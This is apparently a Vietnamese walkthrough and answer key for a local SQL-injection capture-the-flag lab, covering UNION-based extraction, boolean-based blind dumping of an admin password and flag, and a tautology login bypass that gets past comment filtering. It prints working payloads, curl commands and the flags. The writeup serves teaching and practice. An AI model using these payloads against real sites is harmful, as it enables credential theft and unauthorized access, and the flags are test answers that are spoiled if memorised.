# Hướng dẫn khai thác từng bài — MiniStore SQLi CTF (bản rút gọn)

> ⚠️ Tài liệu writeup/đáp án — chỉ dùng trong môi trường lab được cấp phép.
> Giả sử app chạy tại `http://127.0.0.1:8080` (đổi lại nếu bạn deploy port khác).

## Bước 0 — Khởi động

```bash
docker compose up --build
```

Hoặc không dùng Docker: `./run.sh` (app ở cổng 5000).

Script tự động hoá toàn bộ các bước dưới đây, in ra cả 3 flag độc lập:
```bash
pip install requests
python3 exploit.py all --base http://127.0.0.1:8080
```

> **Lưu ý:** `?q=`, `?category=`, `?sort=` ở trang chủ là mồi nhử, đã được
> tham số hoá an toàn. Chỉ `/products?id=`, `/check?username=` và `/login`
> mới chứa lỗ hổng thật.

---

## UNION-based (`/products?id=`)

Ứng dụng không hiển thị lỗi SQL, nên dò dựa vào hành vi trang.

**Bước 1 — dò số cột bằng `UNION SELECT`:**
```
?id=0 UNION SELECT 1,2,3,4,5,6
```
→ Xuất hiện 1 dòng mới (1,2,3,4,5,6) ⇒ đúng 6 cột.

**Bước 2 — liệt kê toàn bộ bảng (có nhiều bảng ảo gây nhiễu, đừng dừng
ở bảng đầu tiên trông "có vẻ đúng"):**
```
?id=0 UNION SELECT 1, name, sql, 1, 1, 1 FROM sqlite_master WHERE type='table'
```
Sẽ thấy thêm `flags`, `flags_backup`, `vault`, `tokens`, `admin_backup`,
`config`. Chỉ `flags` là thật — `flags_backup` cùng schema nhưng chứa
giá trị SAI, `vault` có dòng trông như flag nhưng là **flag giả**.

**Bước 3 — rút flag:**
```
?id=0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'
```
```bash
curl -s "http://127.0.0.1:8080/products" \
  --data-urlencode "id=0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'" -G
```
→ Flag hiện trong cột "Mô tả": `FLAG{un10n_d4t4_dump}`

---

## Boolean-based Blind (`/check?username=`)

Endpoint chỉ trả TAKEN / AVAILABLE — không lộ dữ liệu, không lộ lỗi.
Bài này đi theo **2 bước, dùng chung một oracle**, giống hệt một vụ tấn
công blind SQLi ngoài đời thật: dump được credential **rồi mới** dump
tới flag.

**Bước 1 — xác nhận injection:**
```
?username=admin' AND '1'='1     → TAKEN
?username=admin' AND '1'='2     → AVAILABLE
```

**Bước 2 — dump mật khẩu THẬT của admin (`users.password`)** bằng
binary search trên từng ký tự:
```
?username=nosuchuser' OR ((SELECT unicode(substr(password,1,1)) FROM users WHERE username='admin') > 98) -- 
```
TAKEN ⇒ ký tự tại vị trí đó có mã ASCII lớn hơn mốc so sánh; AVAILABLE ⇒
nhỏ hơn hoặc bằng. Chia đôi khoảng 32–126 đến khi chỉ còn đúng 1 giá trị,
rồi tăng vị trí lên để dò ký tự kế tiếp. → mật khẩu admin:
`b00l34n_bl1nd_pwn3d` (đây là **credential**, chưa phải flag).

**Bước 3 — dùng lại chính oracle đó để dump flag** (`flags.flag WHERE
code='boolean_blind'`), cùng kỹ thuật binary search:
```
?username=nosuchuser' OR ((SELECT unicode(substr(flag,1,1)) FROM flags WHERE code='boolean_blind') > 70) -- 
```
→ Flag: `FLAG{b00l34n_bl1nd_1nf3r3nc3}`

Script `exploit.py` làm đúng 2 bước này tự động, in từng ký tự mới dò
được trên một dòng riêng (xem hàm `do_boolean`/`dump_string`).

---

## Authentication Bypass (`/login`)

**Payload cũ KHÔNG còn hoạt động:** `admin' -- ` bị chặn vì route này
lọc sẵn các ký tự comment SQL (`--`, `/*`, `*/`, `#`).

**Payload mới — tautology ở CẢ 2 trường, không cần comment:**
```
username: x' OR '1'='1
password: y' OR '1'='1
```
Câu truy vấn thật bên trong app:
```sql
WHERE username = 'x' OR '1'='1' AND password = 'y' OR '1'='1'
```
`AND` ưu tiên cao hơn `OR` ⇒ tương đương
`(username='x') OR ('1'='1' AND password='y') OR ('1'='1')` — vế cuối
luôn đúng nên toàn bộ điều kiện luôn đúng, bất kể mật khẩu.

```bash
curl -s -c /tmp/cookies.txt -X POST http://127.0.0.1:8080/login \
  --data-urlencode "username=x' OR '1'='1" \
  --data-urlencode "password=y' OR '1'='1"
curl -s -b /tmp/cookies.txt http://127.0.0.1:8080/dashboard
```
→ Đăng nhập được quyền admin, `/dashboard` hiện flag:
`FLAG{4uth_byp4ss_w1n}`

---

## Bảng tổng kết

| Kỹ thuật | Endpoint | Payload tiêu biểu | Flag |
|----------|----------|--------------------|------|
| UNION-based | `/products?id=` | `0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'` | `FLAG{un10n_d4t4_dump}` |
| Boolean-based Blind | `/check?username=` | `nosuchuser' OR ((SELECT unicode(substr(flag,1,1)) FROM flags WHERE code='boolean_blind')>70) -- ` (sau khi đã dump password) | `FLAG{b00l34n_bl1nd_1nf3r3nc3}` |
| Authentication Bypass | `/login` | `username: x' OR '1'='1` · `password: y' OR '1'='1` | `FLAG{4uth_byp4ss_w1n}` |
